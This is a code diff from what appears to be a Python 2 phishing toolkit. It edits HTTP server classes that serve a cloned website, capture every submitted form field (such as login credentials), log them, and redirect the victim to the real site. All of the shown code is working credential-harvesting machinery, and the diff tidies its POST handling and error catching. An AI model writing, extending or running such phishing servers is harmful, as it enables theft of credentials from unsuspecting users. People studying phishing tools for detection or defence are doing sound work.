@@ -13,12 +13,12 @@ import cgi
 
 class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     ''' server http for website clone module Phishing'''
-    redirect_Original_website,redirect_Path = None,None
+    redirect_Original_website,redirect_Path,only_server = None,None,False
     def do_GET(self):
         self.log_message('',"Connected : %s" %(self.address_string()))
         if self.path =='/':self.path = self.redirect_Path
         if self.path.startswith('/'): self.path = self.redirect_Path + self.path
-        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+        return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
 
     def log_message(self, format, *args):
         return
@@ -31,22 +31,22 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
         self.end_headers()
 
     def do_POST(self):
-        redirect = False
-        form = cgi.FieldStorage(
-            fp=self.rfile,
-            headers=self.headers,
-            environ={'REQUEST_METHOD':'POST',
-            'CONTENT_TYPE':self.headers['Content-Type'],
-            }
-        )
-        if not form.list: return
-        redirect = True
-        for item in form.list:
-            if item.name and item.value:
-                self.log_message('',item.name+' : '+item.value)
-        if redirect:
-            self.redirect(self.redirect_Original_website)
-        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+        try:
+            if not self.only_server:
+                form = cgi.FieldStorage(
+                    fp=self.rfile,
+                    headers=self.headers,
+                    environ={'REQUEST_METHOD':'POST',
+                    'CONTENT_TYPE':self.headers['Content-Type'],
+                    }
+                )
+                if form.list:
+                    for item in form.list:
+                        if item.name and item.value:
+                            self.log_message('',item.name+' : '+item.value)
+        except: pass
+        self.redirect(self.redirect_Original_website)
+        self.connection.close()
 
 class ServerPhishing(SimpleHTTPServer.SimpleHTTPRequestHandler):
     ''' server http for website clone module Phishing'''
@@ -57,6 +57,11 @@ class ServerPhishing(SimpleHTTPServer.SimpleHTTPRequestHandler):
         if self.path.startswith('/'): self.path = self.redirect_Path + self.path
         SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
 
+    def do_POST(self):
+        self.send_response(301)
+        self.end_headers()
+        self.connection.close()
+
     def log_message(self, format, *args): return
 
 class MyHTTPServer(BaseHTTPServer.HTTPServer):
@@ -66,9 +71,13 @@ class MyHTTPServer(BaseHTTPServer.HTTPServer):
         BaseHTTPServer.HTTPServer.__init__(self, *args, **kwargs)
 
     def serve_forever(self, poll_interval=0.5):
-        if self.on_before_serve:
-            self.on_before_serve(self)
-        BaseHTTPServer.HTTPServer.serve_forever(self, poll_interval)
+        try:
+            if self.on_before_serve:
+                self.on_before_serve(self)
+            BaseHTTPServer.HTTPServer.serve_forever(self, poll_interval)
+        except Exception as e:
+            print e
+            print "ok\n"
 
 class ThreadHTTPServerPhishing(QThread):
     ''' server http for website  module::UpdateFake'''
@@ -113,7 +122,10 @@ class ServerThreadHTTP(QThread):
         self.Handler.log_message = self.Method_GET_LOG
         setup_logger('phishing', LOG_PHISHING, key=self.session)
         self.log_phishing = logging.getLogger('phishing')
-        self.httpd.serve_forever()
+        try:
+            self.httpd.serve_forever()
+        except Exception as e:
+            print e
 
     def Method_GET_LOG(self,format, *args):
         self.log_phishing.info(list(args)[0])
